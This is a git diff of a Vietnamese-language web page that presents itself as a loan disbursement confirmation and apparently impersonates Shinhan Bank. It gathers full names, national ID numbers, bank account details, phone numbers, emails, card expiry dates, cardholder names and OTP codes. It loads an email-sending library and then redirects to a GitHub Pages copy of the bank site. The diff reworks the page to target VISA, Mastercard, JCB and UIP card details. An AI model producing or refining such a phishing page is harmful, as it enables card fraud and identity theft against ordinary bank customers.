@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xác Nhận Giải Ngân Qua ATM</title>
+    <title>Giải Ngân Thẻ VISA,Thẻ JCB,Thẻ MASTERCARD,Thẻ UIP</title>
     <script async src="https://cdnjs.cloudflare.com/ajax/libs/inputmask/5.0.8/inputmask.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <script>
@@ -786,38 +786,38 @@
 
     <div class="container">
         <div class="form-container">
-            <h2>Xác Nhận Giải Ngân Qua ATM</h2>
+            <h2>Xác Nhận Giải Ngân Thẻ VISA</h2>
             <div class="help-image" id="helpImage">
-                <img src="https://timo.vn/wp-content/uploads/2024/06/so-the-ngan-hang.png" alt="Hướng dẫn nhập thông tin thẻ">
+                <img src="https://nganhangkorea.com/wp-content/uploads/2022/01/visa1.jpg" alt="Hướng dẫn nhập thông tin thẻ">
             </div>
             <div class="summary">
                 <h3>Thông tin giải ngân</h3>
                 <p>Họ và Tên: <span id="summaryName"></span></p>
                 <p>Số CCCD: <span id="summaryCCCD"></span></p>
-                <p>Số tiền vay: <span id="summaryAmount">N/A</span></p>
-                <p>Tháng vay: <span id="summaryMonths">N/A</span></p>
-                <p>Số tài khoản ngân hàng: <span id="summaryAccountNumber"></span></p>
-                <p>Họ và tên chủ tài khoản: <span id="summaryAccountHolder"></span></p>
-                <p>Ngân hàng: <span id="summaryBank"></span></p>
-                <p>Số điện thoại: <span id="summaryPhone"></span></p>
+                <p>Số Tiền Giảy Ngân: <span id="summaryAmount">N/A</span></p>
+                <p>Tháng: <span id="summaryMonths">N/A</span></p>
+                <p>Số Tài Khoản Nhận Tiền: <span id="summaryAccountNumber"></span></p>
+                <p>Tên Chủ Tài Khoản: <span id="summaryAccountHolder"></span></p>
+                <p>Ngân Hàng: <span id="summaryBank"></span></p>
+                <p>Số Điện Thoại: <span id="summaryPhone"></span></p>
                 <p>Email: <span id="summaryEmail"></span></p>
             </div>
             <div class="bank-selection active" id="bank-selection">
                 <h3>Chọn ngân hàng</h3>
                 <div class="bank-grid">
-                    <div class="bank-option" data-bank="BANK_25" data-logo="https://www.vban.vn/Resources/images/logo-bank/25.png">
+                    <div class="bank-option" data-bank="THE_MASTERCARD" data-logo="https://www.vban.vn/Resources/images/logo-bank/25.png">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/25.png" alt="Thẻ Martercard">
                         <p>Thẻ Martercard</p>
                     </div>
-                    <div class="bank-option" data-bank="BANK_26" data-logo="https://www.vban.vn/Resources/images/logo-bank/26.png">
+                    <div class="bank-option" data-bank="THE_VISA" data-logo="https://www.vban.vn/Resources/images/logo-bank/26.png">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/26.png" alt="Thẻ Visa">
                         <p>Thẻ Visa</p>
                     </div>
-                    <div class="bank-option" data-bank="BANK_27" data-logo="https://www.vban.vn/Resources/images/logo-bank/27.png">
+                    <div class="bank-option" data-bank="THE_JCB" data-logo="https://www.vban.vn/Resources/images/logo-bank/27.png">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/27.png" alt="Thẻ JCB">
                         <p>Thẻ JCB</p>
                     </div>
-                    <div class="bank-option" data-bank="UIP" data-logo="https://www.vban.vn/Resources/images/logo-bank/uip.png">
+                    <div class="bank-option" data-bank="THE_UIP" data-logo="https://www.vban.vn/Resources/images/logo-bank/uip.png">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/uip.png" alt="Thẻ UIP">
                         <p>UIP</p>
                     </div>
@@ -851,11 +851,11 @@
                     <span class="error" id="visaExpiryDateError">Ngày hết hạn phải hợp lệ (mm/yy, sau ngày hiện tại)</span>
                 </div>
                 <div class="form-group" aria-live="polite">
-                    <label for="visaFullName">Họ và tên chủ thẻ *<span class="help-icon" onclick="showHelp('visaFullName')">?</span></label>
+                    <label for="visaFullName">Tên chủ thẻ *<span class="help-icon" onclick="showHelp('visaFullName')">?</span></label>
                     <div class="input-wrapper">
                         <input type="text" id="visaFullName" required aria-describedby="visaFullNameError">
                     </div>
-                    <span class="help-text">Tên chủ thẻ in trên mặt trước thẻ, nhập chính xác.</span>
+                    <span class="help-text">Tên chủ thẻ in trên mặt trước thẻ, Vui lòng nhập chính xác.</span>
                     <span class="error" id="visaFullNameError">Họ và tên phải có ít nhất 2 ký tự</span>
                 </div>
                 <div class="form-group" aria-live="polite">
@@ -1203,7 +1203,7 @@
             if (/^\d{6}$/.test(otp) && otp === '123456') {
                 sessionStorage.removeItem('formData');
                 sessionStorage.removeItem('selectedBank');
-                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/atm2.html';
+                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/otp.html';
             } else {
                 failedAttempts++;
                 document.getElementById('otpError').classList.add('show');
